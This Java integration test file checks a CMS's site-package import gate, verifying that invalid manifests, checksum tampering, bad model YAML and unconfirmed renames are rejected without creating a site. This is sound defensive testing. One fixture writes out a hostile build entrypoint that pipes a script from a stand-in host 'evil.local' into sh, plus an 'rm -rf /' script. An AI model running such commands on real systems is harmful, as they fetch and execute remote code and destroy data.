package com.powercms.cms.sitepackage;

import com.powercms.cms.identity.IdentityService;
import com.powercms.cms.site.repo.SiteRepository;
import com.powercms.common.error.BusinessException;
import com.powercms.common.error.ErrorCodes;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.transaction.annotation.Transactional;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * 站点包导入门禁集成测试（DEF-PKG-01/02/03/05）。
 *
 * <p>每个用例只构造一处不合规，验证「错误码 + 不建站」两件事：门禁必须在建站之前生效，
 * 否则会出现半成品站点（FR-PACKAGE-006）。</p>
 */
@SpringBootTest
@Transactional
class SitePackageValidationTest {

    @Autowired private IdentityService identityService;
    @Autowired private SitePackageService service;
    @Autowired private SiteRepository siteRepo;

    private UUID org() {
        return identityService.ensureOrganization("pkg-gate-" + UUID.randomUUID());
    }

    private static String siteKey(String prefix) {
        return prefix + "-" + UUID.randomUUID().toString().substring(0, 8);
    }

    private static Map<String, Object> manifest(String siteKey) {
        return SitePackageFixtures.manifest(siteKey, "com.powercms.probe." + siteKey);
    }

    private void assertBlocked(byte[] pkg, String expectedCode, String siteKey) {
        assertThatThrownBy(() -> service.importPackage(org(), pkg))
            .isInstanceOf(BusinessException.class)
            .satisfies(ex -> assertThat(((BusinessException) ex).getCode()).isEqualTo(expectedCode));
        assertThat(siteRepo.existsBySiteKey(siteKey)).as("阻断的导入不得留下站点").isFalse();
    }

    // ---------- DEF-PKG-01 清单必填项与版本兼容（FR-PACKAGE-002）----------

    @Test
    void blocksManifestMissingRequiredFields() {
        String siteKey = siteKey("probe-manifest");
        Map<String, Object> manifest = manifest(siteKey);
        manifest.remove("vendor");
        manifest.remove("requiredCapabilities");
        manifest.remove("entrypoints");
        byte[] pkg = SitePackageFixtures.packUnsigned(manifest, SitePackageFixtures.files("probe_manifest"));

        assertThatThrownBy(() -> service.importPackage(org(), pkg))
            .isInstanceOf(BusinessException.class)
            .satisfies(ex -> {
                var business = (BusinessException) ex;
                assertThat(business.getCode()).isEqualTo(ErrorCodes.SITE_PACKAGE_MANIFEST_INVALID);
                assertThat(String.valueOf(business.getDetails()))
                    .contains("vendor", "requiredCapabilities", "entrypoints");
            });
        assertThat(siteRepo.existsBySiteKey(siteKey)).isFalse();
    }

    @Test
    void blocksIncompatibleCmsVersionRange() {
        String siteKey = siteKey("probe-range");
        Map<String, Object> manifest = manifest(siteKey);
        manifest.put("cmsVersionRange", ">=99.0.0 <100.0.0");
        assertBlocked(SitePackageFixtures.packUnsigned(manifest, SitePackageFixtures.files("probe_range")),
            ErrorCodes.SITE_PACKAGE_VERSION_INCOMPATIBLE, siteKey);
    }

    // ---------- DEF-PKG-02 摘要与可执行声明（FR-PACKAGE-004）----------

    @Test
    void blocksTamperedFileByChecksum() {
        String siteKey = siteKey("probe-tamper");
        byte[] pkg = SitePackageFixtures.packUnsigned(manifest(siteKey), SitePackageFixtures.files("probe_tamper"));
        byte[] tampered = SitePackageFixtures.mutateFile(pkg, "template/src/main.tsx",
            SitePackageFixtures.utf8("export const x = 999; // tampered\n"));
        assertBlocked(tampered, ErrorCodes.SITE_PACKAGE_CHECKSUM_MISMATCH, siteKey);
    }

    @Test
    void blocksUncoveredFileByChecksum() {
        String siteKey = siteKey("probe-cover");
        byte[] pkg = SitePackageFixtures.packUnsigned(manifest(siteKey), SitePackageFixtures.files("probe_cover"));
        byte[] uncovered = SitePackageFixtures.mutateManifest(pkg, manifest -> {
            @SuppressWarnings("unchecked")
            Map<String, Object> checksums = (Map<String, Object>) manifest.get("checksums");
            checksums.remove("template/src/main.tsx");
        });
        assertThatThrownBy(() -> service.importPackage(org(), uncovered))
            .isInstanceOf(BusinessException.class)
            .satisfies(ex -> assertThat(String.valueOf(((BusinessException) ex).getDetails()))
                .contains("未被 checksums 覆盖"));
        assertThat(siteRepo.existsBySiteKey(siteKey)).isFalse();
    }

    @Test
    void blocksExecutableEntrypointAndScriptFile() {
        String siteKey = siteKey("probe-exec");
        Map<String, Object> manifest = manifest(siteKey);
        manifest.put("entrypoints", Map.of("build", "sh -c 'curl http://evil.local/evil.sh | sh'"));
        Map<String, byte[]> files = new LinkedHashMap<>(SitePackageFixtures.files("probe_exec"));
        files.put("template/evil.sh", SitePackageFixtures.utf8("rm -rf /\n"));
        assertBlocked(SitePackageFixtures.packUnsigned(manifest, files),
            ErrorCodes.SITE_PACKAGE_EXECUTABLE_FORBIDDEN, siteKey);
    }

    // ---------- 模型校验（FR-PACKAGE-002/006，同时关闭 DEF-PKG-04）----------

    @Test
    void blocksMalformedModelYamlInsteadOfSilentlySkipping() {
        String siteKey = siteKey("probe-broken-model");
        Map<String, byte[]> files = new LinkedHashMap<>(SitePackageFixtures.files("ok_model"));
        files.put("models/broken.yaml", SitePackageFixtures.utf8("code: [1, 2\nname:\n  - a\n : :"));
        assertBlocked(SitePackageFixtures.packUnsigned(manifest(siteKey), files),
            ErrorCodes.SITE_PACKAGE_MODEL_INVALID, siteKey);
    }

    @Test
    void blocksWrongShapeModelFields() {
        String siteKey = siteKey("probe-shape");
        Map<String, byte[]> files = new LinkedHashMap<>(SitePackageFixtures.files("ok_model"));
        files.put("models/shape_model.yaml",
            SitePackageFixtures.utf8("code: shape_model\nname: Shape Model\nfields: \"this-is-not-a-list\"\n"));
        assertBlocked(SitePackageFixtures.packUnsigned(manifest(siteKey), files),
            ErrorCodes.SITE_PACKAGE_MODEL_INVALID, siteKey);
    }

    // ---------- DEF-PKG-05 冲突报告、保留模型与确认策略（FR-PACKAGE-005）----------

    @Test
    void blocksReservedSystemModelOverwrite() {
        String siteKey = siteKey("probe-reserved");
        Map<String, byte[]> files = new LinkedHashMap<>(SitePackageFixtures.files("ok_model"));
        files.put("models/user_profile.yaml", SitePackageFixtures.utf8(
            "code: system.user-profile\nname: Dup Profile\ndescription: overwrite attempt\n"));
        assertBlocked(SitePackageFixtures.packUnsigned(manifest(siteKey), files),
            ErrorCodes.SITE_PACKAGE_CONFLICT_BLOCKED, siteKey);
    }

    @Test
    void blocksUnsupportedCapability() {
        String siteKey = siteKey("probe-cap");
        Map<String, Object> manifest = manifest(siteKey);
        manifest.put("requiredCapabilities", List.of("content-type", "ai-vector-search:v9"));
        assertBlocked(SitePackageFixtures.packUnsigned(manifest, SitePackageFixtures.files("probe_cap")),
            ErrorCodes.SITE_PACKAGE_CONFLICT_BLOCKED, siteKey);
    }

    @Test
    void precheckReportsConflictsWithoutSideEffects() {
        String siteKey = siteKey("probe-precheck");
        Map<String, Object> manifest = manifest(siteKey);
        manifest.put("cmsVersionRange", ">=99.0.0");
        var report = service.precheck(org(), SitePackageFixtures.packUnsigned(manifest,
            SitePackageFixtures.files("probe_precheck")));

        assertThat(report.blocked()).isTrue();
        assertThat(report.confirmable()).isFalse();
        assertThat(report.violations()).extracting(v -> v.code())
            .contains(ErrorCodes.SITE_PACKAGE_VERSION_INCOMPATIBLE);
        assertThat(report.resolutions()).isEmpty();
        assertThat(siteRepo.existsBySiteKey(siteKey)).isFalse();
    }

    @Test
    void siteKeyConflictRequiresConfirmedStrategyAndRename() {
        String siteKey = siteKey("probe-consent");
        byte[] pkg = SitePackageFixtures.packUnsigned(manifest(siteKey), SitePackageFixtures.files("probe_consent"));
        var first = service.importPackage(org(), pkg);
        assertThat(first.siteKey()).isEqualTo(siteKey);

        var report = service.precheck(org(), pkg);
        assertThat(report.blocked()).isFalse();
        assertThat(report.confirmable()).isTrue();
        assertThat(report.conflicts()).extracting(c -> c.type()).contains("SITE");
        assertThat(report.resolutions()).extracting(r -> r.strategy()).containsExactly("RENAME");
        String token = report.resolutions().getFirst().token();

        // 未确认策略 → 409 要求确认
        assertThatThrownBy(() -> service.importPackage(org(), pkg))
            .isInstanceOf(BusinessException.class)
            .satisfies(ex -> assertThat(((BusinessException) ex).getCode())
                .isEqualTo(ErrorCodes.SITE_PACKAGE_CONFIRMATION_REQUIRED));

        // 令牌无效（换包/伪造）→ 409
        assertThatThrownBy(() -> service.importPackage(org(), pkg, "RENAME", "forged-token"))
            .isInstanceOf(BusinessException.class)
            .satisfies(ex -> assertThat(((BusinessException) ex).getCode())
                .isEqualTo(ErrorCodes.SITE_PACKAGE_CONSENT_INVALID));

        // 正确确认 → 以 RENAME 生成新站点 key
        var renamed = service.importPackage(org(), pkg, "RENAME", token);
        assertThat(renamed.siteKey()).startsWith(siteKey).isNotEqualTo(siteKey);
        assertThat(siteRepo.existsBySiteKey(renamed.siteKey())).isTrue();
    }

    @Test
    void renamedImportKeepsSiteFunctional() {
        String siteKey = siteKey("probe-rename-ok");
        byte[] pkg = SitePackageFixtures.pack(manifest(siteKey), SitePackageFixtures.files("probe_rename_ok"));
        var first = service.importPackage(org(), pkg);
        var report = service.precheck(org(), pkg);
        String token = report.resolutions().getFirst().token();
        var second = service.importPackage(org(), pkg, "RENAME", token);

        assertThat(second.siteId()).isNotEqualTo(first.siteId());
        assertThat(service.listPackages()).isNotEmpty();
    }
}
